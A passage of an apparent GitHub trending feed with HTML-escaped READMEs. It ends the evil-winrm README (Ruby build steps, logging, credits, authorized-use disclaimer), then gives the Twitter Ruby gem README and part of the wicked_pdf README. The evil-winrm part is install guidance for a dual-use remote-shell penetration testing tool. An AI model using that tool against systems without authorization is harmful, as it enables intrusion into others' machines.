/usr/bin/evil-winrm&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then you can safely launch evil-winrm using the new installed ruby with the required readline support from any location.&lt;/p&gt; &#xA;&lt;h4&gt;Method 3 (compile entire ruby)&lt;/h4&gt; &#xA;&lt;p&gt;If you want to compile it yourself, you can follow these steps. Let&#39;s suppose that you want ruby 2.7.3:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;wget -O ruby-install-0.8.1.tar.gz https://github.com/postmodern/ruby-install/archive/v0.8.1.tar.gz&#xA;tar -xzvf ruby-install-0.8.1.tar.gz&#xA;cd ruby-install-0.8.1/&#xA;sudo make install&#xA;ruby-install ruby 2.7.3 -- --with-readline-dir=/usr/include/readline&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Depending of your system it will be installed at &lt;code&gt;/opt/rubies/ruby-2.7.3&lt;/code&gt; or maybe at &lt;code&gt; ~/.rubies/ruby-2.7.3&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Now just need to install evil-winrm dependencies for that new installed ruby version. The easiest way is to launch command &lt;code&gt;/opt/rubies/ruby-2.7.3/bin/gem install evil-winrm&lt;/code&gt;. The gem command used must be belonging to the new ruby installation.&lt;/p&gt; &#xA;&lt;p&gt;After that, you can launch safely your new installed ruby to use it on evil-winrm: &lt;code&gt;/opt/rubies/ruby-2.7.3/bin/ruby ./evil-winrm.rb -h&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;It is recommended to use this new installed ruby only to launch evil-winrm. If you set it up as your default ruby for your system, bear in mind that it has no dependency gems installed. Some ruby based software like Metasploit or others could not start correctly due dependencies problems.&lt;/p&gt; &#xA;&lt;h3&gt;Logging&lt;/h3&gt; &#xA;&lt;p&gt;This feature will create files on your $HOME dir saving commands and the outputs of the WinRM sessions&lt;/p&gt; &#xA;&lt;h2&gt;Changelog:&lt;/h2&gt; &#xA;&lt;p&gt;Changelog and project changes can be checked here: &lt;a href=&#34;https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/CHANGELOG.md&#34;&gt;CHANGELOG.md&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Credits:&lt;/h2&gt; &#xA;&lt;p&gt;Staff:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cybervaca&#34;&gt;Cybervaca&lt;/a&gt;, (founder). Twitter: &lt;a href=&#34;https://twitter.com/CyberVaca_&#34;&gt;@CyberVaca_&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/OscarAkaElvis&#34;&gt;OscarAkaElvis&lt;/a&gt;, Twitter: &lt;a href=&#34;https://twitter.com/OscarAkaElvis&#34;&gt;@OscarAkaElvis&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jarilaos&#34;&gt;Jarilaos&lt;/a&gt;, Twitter: &lt;a href=&#34;https://twitter.com/_Laox&#34;&gt;@_Laox&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/arale61&#34;&gt;arale61&lt;/a&gt;, Twitter: &lt;a href=&#34;https://twitter.com/arale61&#34;&gt;@arale61&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Hat tip to:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/vmotos&#34;&gt;Vis0r&lt;/a&gt; for his personal support.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Alamot&#34;&gt;Alamot&lt;/a&gt; for his original code.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/3v4Si0N&#34;&gt;3v4Si0N&lt;/a&gt; for his awesome dll loader.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/WinRb/WinRM/graphs/contributors&#34;&gt;WinRb&lt;/a&gt; All contributors of ruby library.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/TheWover&#34;&gt;TheWover&lt;/a&gt; for his awesome donut tool.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/byt3bl33d3r&#34;&gt;byt3bl33d3r&lt;/a&gt; for his python library to create donut payloads.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Sh11td0wn&#34;&gt;Sh11td0wn&lt;/a&gt; for inspiration about new features.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Stoo0rmq&#34;&gt;Borch&lt;/a&gt; for his help adding logging feature.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.hackplayers.com/&#34;&gt;Hackplayers&lt;/a&gt; for giving a shelter on their github to this software.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Disclaimer &amp;amp; License&lt;/h2&gt; &#xA;&lt;p&gt;This script is licensed under LGPLv3+. Direct link to &lt;a href=&#34;https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/LICENSE&#34;&gt;License&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Evil-WinRM should be used for authorized penetration testing and/or nonprofit educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own servers and/or with the server owner&#39;s permission.&lt;/p&gt; &#xA;&lt;!-- Github URLs --&gt; &#xA;&lt;!-- Twitter URLs --&gt; &#xA;&lt;!-- Badges URLs --&gt;</summary>
  </entry>
  <entry>
    <title>sferik/twitter</title>
    <updated>2023-04-30T02:05:40Z</updated>
    <id>tag:github.com,2023-04-30:/sferik/twitter</id>
    <link href="https://github.com/sferik/twitter" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A Ruby interface to the Twitter API.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;The Twitter Ruby Gem&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://rubygems.org/gems/twitter&#34;&gt;&lt;img src=&#34;https://badge.fury.io/rb/twitter.svg?sanitize=true&#34; alt=&#34;Gem Version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://travis-ci.org/sferik/twitter&#34;&gt;&lt;img src=&#34;https://travis-ci.org/sferik/twitter.svg?branch=master&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codeclimate.com/github/sferik/twitter/maintainability&#34;&gt;&lt;img src=&#34;https://api.codeclimate.com/v1/badges/09362621ad91e8f599b3/maintainability&#34; alt=&#34;Maintainability&#34;&gt;&lt;/a&gt; &lt;a href=&#34;http://inch-ci.org/github/sferik/twitter&#34;&gt;&lt;img src=&#34;http://inch-ci.org/github/sferik/twitter.svg?style=shields&#34; alt=&#34;Inline docs&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;A Ruby interface to the Twitter API.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;gem install twitter&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;CLI&lt;/h2&gt; &#xA;&lt;p&gt;Looking for the Twitter command-line interface? It was &lt;a href=&#34;https://github.com/sferik/twitter/commit/dd2445e3e2c97f38b28a3f32ea902536b3897adf&#34;&gt;removed&lt;/a&gt; from this gem in version 0.5.0 and now exists as a &lt;a href=&#34;https://github.com/sferik/t&#34;&gt;separate project&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://rdoc.info/gems/twitter&#34;&gt;http://rdoc.info/gems/twitter&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Examples&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/sferik/twitter/tree/master/examples&#34;&gt;https://github.com/sferik/twitter/tree/master/examples&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Announcements&lt;/h2&gt; &#xA;&lt;p&gt;You should &lt;a href=&#34;https://twitter.com/gem&#34;&gt;follow @gem&lt;/a&gt; on Twitter for announcements and updates about this library.&lt;/p&gt; &#xA;&lt;h2&gt;Mailing List&lt;/h2&gt; &#xA;&lt;p&gt;Please direct questions about this library to the &lt;a href=&#34;https://groups.google.com/group/twitter-ruby-gem&#34;&gt;mailing list&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Apps Wiki&lt;/h2&gt; &#xA;&lt;p&gt;Does your project or organization use this gem? Add it to the &lt;a href=&#34;https://github.com/sferik/twitter/wiki/apps&#34;&gt;apps wiki&lt;/a&gt;!&lt;/p&gt; &#xA;&lt;h2&gt;Configuration&lt;/h2&gt; &#xA;&lt;p&gt;Twitter API v1.1 requires you to authenticate via OAuth, so you&#39;ll need to &lt;a href=&#34;https://apps.twitter.com/&#34;&gt;register your application with Twitter&lt;/a&gt;. Once you&#39;ve registered an application, make sure to set the correct access level, otherwise you may see the error:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Read-only application cannot POST&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Your new application will be assigned a consumer key/secret pair and you will be assigned an OAuth access token/secret pair for that application. You&#39;ll need to configure these values before you make a request or else you&#39;ll get the error:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Bad Authentication data&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can pass configuration options as a block to &lt;code&gt;Twitter::REST::Client.new&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client = Twitter::REST::Client.new do |config|&#xA;  config.consumer_key        = &#34;YOUR_CONSUMER_KEY&#34;&#xA;  config.consumer_secret     = &#34;YOUR_CONSUMER_SECRET&#34;&#xA;  config.access_token        = &#34;YOUR_ACCESS_TOKEN&#34;&#xA;  config.access_token_secret = &#34;YOUR_ACCESS_SECRET&#34;&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Usage Examples&lt;/h2&gt; &#xA;&lt;p&gt;After configuring a &lt;code&gt;client&lt;/code&gt;, you can do the following things.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Tweet (as the authenticated user)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.update(&#34;I&#39;m tweeting with @gem!&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Follow a user (by screen name or user ID)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.follow(&#34;gem&#34;)&#xA;client.follow(213747670)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Fetch a user (by screen name or user ID)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.user(&#34;gem&#34;)&#xA;client.user(213747670)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Fetch a cursored list of followers with profile details (by screen name or user ID, or by implicit authenticated user)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.followers(&#34;gem&#34;)&#xA;client.followers(213747670)&#xA;client.followers&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Fetch a cursored list of friends with profile details (by screen name or user ID, or by implicit authenticated user)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.friends(&#34;gem&#34;)&#xA;client.friends(213747670)&#xA;client.friends&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Fetch the timeline of Tweets by a user&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.user_timeline(&#34;gem&#34;)&#xA;client.user_timeline(213747670)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Fetch the timeline of Tweets from the authenticated user&#39;s home page&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.home_timeline&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Fetch the timeline of Tweets mentioning the authenticated user&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.mentions_timeline&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Fetch a particular Tweet by ID&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.status(27558893223)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Collect the three most recent marriage proposals to @justinbieber&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.search(&#34;to:justinbieber marry me&#34;, result_type: &#34;recent&#34;).take(3).collect do |tweet|&#xA;  &#34;#{tweet.user.screen_name}: #{tweet.text}&#34;&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Find a Japanese-language Tweet tagged #ruby (excluding retweets)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.search(&#34;#ruby -rt&#34;, lang: &#34;ja&#34;).first.text&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For more usage examples, please see the full &lt;a href=&#34;http://rdoc.info/gems/twitter&#34;&gt;documentation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Streaming&lt;/h2&gt; &#xA;&lt;p&gt;Site Streams are restricted to whitelisted accounts. To apply for access, &lt;a href=&#34;https://dev.twitter.com/streaming/sitestreams#applyingforaccess&#34;&gt;follow the steps in the Site Streams documentation&lt;/a&gt;. &lt;a href=&#34;https://dev.twitter.com/streaming/userstreams&#34;&gt;User Streams&lt;/a&gt; do not require prior approval.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Configuration works just like &lt;code&gt;Twitter::REST::Client&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client = Twitter::Streaming::Client.new do |config|&#xA;  config.consumer_key        = &#34;YOUR_CONSUMER_KEY&#34;&#xA;  config.consumer_secret     = &#34;YOUR_CONSUMER_SECRET&#34;&#xA;  config.access_token        = &#34;YOUR_ACCESS_TOKEN&#34;&#xA;  config.access_token_secret = &#34;YOUR_ACCESS_SECRET&#34;&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Stream a random sample of all tweets&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.sample do |object|&#xA;  puts object.text if object.is_a?(Twitter::Tweet)&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Stream mentions of coffee or tea&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;topics = [&#34;coffee&#34;, &#34;tea&#34;]&#xA;client.filter(track: topics.join(&#34;,&#34;)) do |object|&#xA;  puts object.text if object.is_a?(Twitter::Tweet)&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Stream tweets, events, and direct messages for the authenticated user&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.user do |object|&#xA;  case object&#xA;  when Twitter::Tweet&#xA;    puts &#34;It&#39;s a tweet!&#34;&#xA;  when Twitter::DirectMessage&#xA;    puts &#34;It&#39;s a direct message!&#34;&#xA;  when Twitter::Streaming::StallWarning&#xA;    warn &#34;Falling behind!&#34;&#xA;  end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;An &lt;code&gt;object&lt;/code&gt; may be one of the following:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;Twitter::Tweet&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Twitter::DirectMessage&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Twitter::Streaming::DeletedTweet&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Twitter::Streaming::Event&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Twitter::Streaming::FriendList&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Twitter::Streaming::StallWarning&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Ads&lt;/h2&gt; &#xA;&lt;p&gt;We recommend using the &lt;a href=&#34;http://twitterdev.github.io/twitter-ruby-ads-sdk/&#34;&gt;Twitter Ads SDK for Ruby&lt;/a&gt; to interact with the Twitter Ads API.&lt;/p&gt; &#xA;&lt;h2&gt;Object Graph&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.rawgit.com/sferik/twitter/master/etc/erd.svg?sanitize=true&#34; alt=&#34;Entity-relationship diagram&#34; title=&#34;Entity-relationship diagram&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;This entity-relationship diagram is generated programatically. If you add or remove any Twitter objects, please regenerate the ERD with the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;bundle exec rake erd&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Supported Ruby Versions&lt;/h2&gt; &#xA;&lt;p&gt;This library aims to support and is &lt;a href=&#34;https://travis-ci.org/sferik/twitter&#34;&gt;tested against&lt;/a&gt; the following Ruby versions:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Ruby 2.7&lt;/li&gt; &#xA; &lt;li&gt;Ruby 3.0&lt;/li&gt; &#xA; &lt;li&gt;Ruby 3.1&lt;/li&gt; &#xA; &lt;li&gt;Ruby 3.2&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If something doesn&#39;t work on one of these versions, it&#39;s a bug.&lt;/p&gt; &#xA;&lt;p&gt;This library may inadvertently work (or seem to work) on other Ruby versions, however support will only be provided for the versions listed above.&lt;/p&gt; &#xA;&lt;p&gt;If you would like this library to support another Ruby version or implementation, you may volunteer to be a maintainer. Being a maintainer entails making sure all tests run and pass on that implementation. When something breaks on your implementation, you will be responsible for providing patches in a timely fashion. If critical issues for a particular implementation exist at the time of a major release, support for that Ruby version may be dropped.&lt;/p&gt; &#xA;&lt;h2&gt;Versioning&lt;/h2&gt; &#xA;&lt;p&gt;This library aims to adhere to &lt;a href=&#34;http://semver.org/&#34;&gt;Semantic Versioning 2.0.0&lt;/a&gt;. Violations of this scheme should be reported as bugs. Specifically, if a minor or patch version is released that breaks backward compatibility, that version should be immediately yanked and/or a new version should be immediately released that restores compatibility. Breaking changes to the public API will only be introduced with new major versions. As a result of this policy, you can (and should) specify a dependency on this gem using the &lt;a href=&#34;http://guides.rubygems.org/patterns/#pessimistic-version-constraint&#34;&gt;Pessimistic Version Constraint&lt;/a&gt; with two digits of precision. For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;spec.add_dependency &#39;twitter&#39;, &#39;~&amp;gt; 6.0&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Copyright&lt;/h2&gt; &#xA;&lt;p&gt;Copyright (c) 2006-2016 Erik Berlin, John Nunemaker, Wynn Netherland, Steve Richert, Steve Agalloco. See &lt;a href=&#34;https://raw.githubusercontent.com/sferik/twitter/master/LICENSE.md&#34;&gt;LICENSE&lt;/a&gt; for details.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>mileszs/wicked_pdf</title>
    <updated>2023-04-30T02:05:40Z</updated>
    <id>tag:github.com,2023-04-30:/mileszs/wicked_pdf</id>
    <link href="https://github.com/mileszs/wicked_pdf" rel="alternate"></link>
    <summary type="html">&lt;p&gt;PDF generator (from HTML) plugin for Ruby on Rails&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Wicked PDF &lt;a href=&#34;http://badge.fury.io/rb/wicked_pdf&#34;&gt;&lt;img src=&#34;https://badge.fury.io/rb/wicked_pdf.svg?sanitize=true&#34; alt=&#34;Gem Version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/mileszs/wicked_pdf/actions/workflows/ci.yml&#34;&gt;&lt;img src=&#34;https://github.com/mileszs/wicked_pdf/actions/workflows/ci.yml/badge.svg?sanitize=true&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codeclimate.com/github/mileszs/wicked_pdf&#34;&gt;&lt;img src=&#34;https://codeclimate.com/github/mileszs/wicked_pdf/badges/gpa.svg?sanitize=true&#34; alt=&#34;Code Climate&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.codetriage.com/mileszs/wicked_pdf&#34;&gt;&lt;img src=&#34;https://www.codetriage.com/mileszs/wicked_pdf/badges/users.svg?sanitize=true&#34; alt=&#34;Open Source Helpers&#34;&gt;&lt;/a&gt;&lt;/h1&gt; &#xA;&lt;h2&gt;A PDF generation plugin for Ruby on Rails&lt;/h2&gt; &#xA;&lt;p&gt;Wicked PDF uses the shell utility &lt;a href=&#34;http://wkhtmltopdf.org&#34;&gt;wkhtmltopdf&lt;/a&gt; to serve a PDF file to a user from HTML. In other words, rather than dealing with a PDF generation DSL of some sort, you simply write an HTML view as you would normally, then let Wicked PDF take care of the hard stuff.&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Wicked PDF has been verified to work on Ruby versions 2.2 through 2.6; Rails 4 through 6.1&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Installation&lt;/h3&gt; &#xA;&lt;p&gt;Add this to your Gemfile and run &lt;code&gt;bundle install&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;gem &#39;wicked_pdf&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then create the initializer with&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;rails generate wicked_pdf&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You may also need to add&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;Mime::Type.register &#34;application/pdf&#34;, :pdf&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;to &lt;code&gt;config/initializers/mime_types.rb&lt;/code&gt; in older versions of Rails.&lt;/p&gt; &#xA;&lt;p&gt;Because &lt;code&gt;wicked_pdf&lt;/code&gt; is a wrapper for &lt;a href=&#34;http://wkhtmltopdf.org/&#34;&gt;wkhtmltopdf&lt;/a&gt;, you&#39;ll need to install that, too.&lt;/p&gt; &#xA;&lt;p&gt;The simplest way to install all of the binaries on most Linux or OSX systems is through the gem &lt;a href=&#34;https://github.com/zakird/wkhtmltopdf_binary_gem&#34;&gt;wkhtmltopdf-binary&lt;/a&gt;. Builds for other systems are available &lt;a href=&#34;https://wkhtmltopdf.org/downloads.html&#34;&gt;here&lt;/a&gt; To install that gem, add this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;gem &#39;wkhtmltopdf-binary&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To your Gemfile and run &lt;code&gt;bundle install&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;This gem currently installs version 0.12.x of &lt;code&gt;wkhtmltopdf&lt;/code&gt;. Some of the options listed below are specific 0.9 or below, and others are for 0.12 and up.&lt;/p&gt; &#xA;&lt;p&gt;You can see what flags are supported for the current version in &lt;a href=&#34;https://wkhtmltopdf.org/usage/wkhtmltopdf.txt&#34;&gt;wkhtmltopdf&#39;s auto-generated manual&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;If your wkhtmltopdf executable is not on your webserver&#39;s path, you can configure it in an initializer:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;WickedPdf.config = {&#xA;  exe_path: &#39;/usr/local/bin/wkhtmltopdf&#39;,&#xA;  enable_local_file_access: true&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For more information about &lt;code&gt;wkhtmltopdf&lt;/code&gt;, see the project&#39;s &lt;a href=&#34;http://wkhtmltopdf.org/&#34;&gt;homepage&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Basic Usage&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class ThingsController &amp;lt; ApplicationController&#xA;  def show&#xA;    respond_to do |format|&#xA;      format.html&#xA;      format.pdf do&#xA;        render pdf: &#34;file_name&#34;   # Excluding &#34;.pdf&#34; extension.&#xA;      end&#xA;    end&#xA;  end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Usage Conditions - Important!&lt;/h3&gt; &#xA;&lt;p&gt;The wkhtmltopdf binary is run outside of your Rails application; therefore, your normal layouts will not work. If you plan to use any CSS, JavaScript, or image files, you must modify your layout so that you provide an absolute reference to these files. The best option for Rails without the asset pipeline is to use the &lt;code&gt;wicked_pdf_stylesheet_link_tag&lt;/code&gt;, &lt;code&gt;wicked_pdf_image_tag&lt;/code&gt;, and &lt;code&gt;wicked_pdf_javascript_include_tag&lt;/code&gt; helpers or to go straight to a CDN (Content Delivery Network) for popular libraries such as jQuery.&lt;/p&gt; &#xA;&lt;h4&gt;wicked_pdf helpers&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!doctype html&amp;gt;&#xA;&amp;lt;html&amp;gt;&#xA;  &amp;lt;head&amp;gt;&#xA;    &amp;lt;meta charset=&#39;utf-8&#39; /&amp;gt;&#xA;    &amp;lt;%= wicked_pdf_stylesheet_link_tag &#34;pdf&#34; -%&amp;gt;&#xA;    &amp;lt;%= wicked_pdf_javascript_include_tag &#34;number_pages&#34; %&amp;gt;&#xA;  &amp;lt;/head&amp;gt;&#xA;  &amp;lt;body onload=&#39;number_pages&#39;&amp;gt;&#xA;    &amp;lt;div id=&#34;header&#34;&amp;gt;&#xA;      &amp;lt;%= wicked_pdf_image_tag &#39;mysite.jpg&#39; %&amp;gt;&#xA;    &amp;lt;/div&amp;gt;&#xA;    &amp;lt;div id=&#34;content&#34;&amp;gt;&#xA;      &amp;lt;%= yield %&amp;gt;&#xA;    &amp;lt;/div&amp;gt;&#xA;  &amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Using wicked_pdf_helpers with asset pipeline raises &lt;code&gt;Asset names passed to helpers should not include the &#34;/assets/&#34; prefix.&lt;/code&gt; error. To work around this, you can use &lt;code&gt;wicked_pdf_asset_base64&lt;/code&gt; with the normal Rails helpers, but be aware that this will base64 encode your content and inline it in the page. This is very quick for small assets, but large ones can take a long time.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!doctype html&amp;gt;&#xA;&amp;lt;html&amp;gt;&#xA;  &amp;lt;head&amp;gt;&#xA;    &amp;lt;meta charset=&#39;utf-8&#39; /&amp;gt;&#xA;    &amp;lt;%= stylesheet_link_tag wicked_pdf_asset_base64(&#34;pdf&#34;) %&amp;gt;&#xA;    &amp;lt;%= javascript_include_tag wicked_pdf_asset_base64(&#34;number_pages&#34;) %&amp;gt;&#xA;&#xA;  &amp;lt;/head&amp;gt;&#xA;  &amp;lt;body onload=&#39;number_pages&#39;&amp;gt;&#xA;    &amp;lt;div id=&#34;header&#34;&amp;gt;&#xA;      &amp;lt;%= image_tag wicked_pdf_asset_base64(&#39;mysite.jpg&#39;) %&amp;gt;&#xA;    &amp;lt;/div&amp;gt;&#xA;    &amp;lt;div id=&#34;content&#34;&amp;gt;&#xA;      &amp;lt;%= yield %&amp;gt;&#xA;    &amp;lt;/div&amp;gt;&#xA;  &amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Webpacker usage&lt;/h4&gt; &#xA;&lt;p&gt;wicked_pdf supports webpack assets.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Use &lt;code&gt;wicked_pdf_stylesheet_pack_tag&lt;/code&gt; for stylesheets&lt;/li&gt; &#xA; &lt;li&gt;Use &lt;code&gt;wicked_pdf_javascript_pack_tag&lt;/code&gt; for javascripts&lt;/li&gt; &#xA; &lt;li&gt;Use &lt;code&gt;wicked_pdf_asset_pack_path&lt;/code&gt; to access an asset directly, for example: &lt;code&gt;image_tag wicked_pdf_asset_pack_path(&#34;media/images/foobar.png&#34;)&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; 